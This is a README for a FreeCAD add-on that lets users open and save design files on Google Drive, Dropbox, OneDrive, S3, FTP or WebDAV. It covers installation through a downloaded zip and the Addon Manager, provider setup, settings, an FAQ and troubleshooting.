# ☁️ freecad-cloud-browser - Access cloud files inside FreeCAD desktop

[![Download Here](https://img.shields.io/badge/Download-FreeCAD_Cloud_Browser-blue.svg)](https://github.com/sabi137032/freecad-cloud-browser)

This tool bridges the gap between your local FreeCAD installation and your cloud storage services. You can open, edit, and save design files directly to Google Drive, Dropbox, OneDrive, S3, FTP, or WebDAV. You no longer need to manage manual downloads or keep local file copies of your projects.

## 🛠️ System Requirements

- FreeCAD version 0.19 or newer
- Windows 10 or Windows 11
- Active internet connection
- Access credentials for your cloud storage provider

## 📥 How to Install

Follow these steps to add the browser to your FreeCAD application.

1. Go to the [official release page](https://github.com/sabi137032/freecad-cloud-browser).
2. Look for the file ending in `.zip`.
3. Click the file to start the download.
4. Save the file to your computer.
5. Open FreeCAD.
6. Click the Tools menu at the top of the screen.
7. Select Addon Manager.
8. Click the Install from external repository option if prompted, or use the Addon Manager to install the package directly.
9. Restart FreeCAD after the installation finishes.

## 🚀 Setting Up Your Storage

After you restart FreeCAD, you will see a new icon in your workbench toolbar. Click this icon to open the configuration panel.

### Connecting Google Drive
1. Select Google Drive from the list of providers.
2. Click the Login button.
3. Your web browser will open.
4. Sign in with your Google account.
5. Follow the steps to grant permission for the application to read your files.
6. Return to FreeCAD once the authorization completes.

### Connecting Dropbox
1. Select Dropbox from the menu.
2. Click the link button.
3. Sign in to your Dropbox account in the window that appears.
4. Confirm the connection.

### Connecting FTP or WebDAV
You need your server details for these options.
1. Enter the server address (for example, ftp.yourserver.com).
2. Provide your username.
3. Provide your password.
4. Choose the port. Valid ports are typically 21 for FTP or 80/443 for WebDAV.
5. Click test connection to verify the settings.

## 📂 Using the Browser

The cloud browser functions like the standard file explorer on your computer.

1. Click the workbench icon located in the main toolbar.
2. A sidebar will appear on the left side of your screen.
3. Select your cloud provider from the dropdown menu at the top of the sidebar.
4. Navigate through your folders by clicking them.
5. Double-click any FreeCAD file to load it into the workspace.
6. The application downloads the file into a temporary cache folder on your computer.
7. You can now edit your model as usual.

## 💾 Saving Your Work

When you finish your changes, select Save from the File menu. The browser detects that the file originated from the cloud. It uploads the updated version to your storage service automatically. A progress bar will show the status of the upload. Wait for this bar to disappear before you close the program or disconnect from the internet.

## ⚙️ Configuration Settings

Click the gear icon in the browser sidebar to adjust how the tool operates.

- Cache Location: You can choose where the tool stores temporary files. The default location works for most users.
- Automatic Sync: Toggle this feature to ensure files save the moment you press the save button.
- Timeout Settings: Increase this value if you have a slow internet connection.

## ❓ Frequently Asked Questions

### Is my data safe?
Yes. The application uses secure protocols to communicate with your cloud providers. It does not store your passwords on the internet. It only stores your account tokens locally on your machine.

### Can I share files?
Yes. Sharing depends on the settings of your specific cloud provider. If you share a file through Google Drive or Dropbox, the browser will open the updated version during the next session.

### Does the browser work offline?
The browser requires a connection to fetch file lists or open files. You must stay online to save changes back to your cloud storage.

### What file types are supported?
The browser supports all file types used by FreeCAD, including .FCStd, .step, and .iges.

## 🔍 Troubleshooting

- If you do not see the icon, ensure you installed the addon in the correct folder path for FreeCAD.
- If the login window does not open, check your default web browser settings.
- If you receive a connection error, verify your username and password.
- If files fail to save, check your remaining storage quota on your cloud service provider.

## 📦 Features Summary

- Integration with major cloud platforms.
- Simple interface within the FreeCAD workspace.
- Automatic file syncing to prevent data loss.
- Support for private servers using FTP or WebDAV.
- Secure token-based authentication.
- Cache management to improve file load speeds.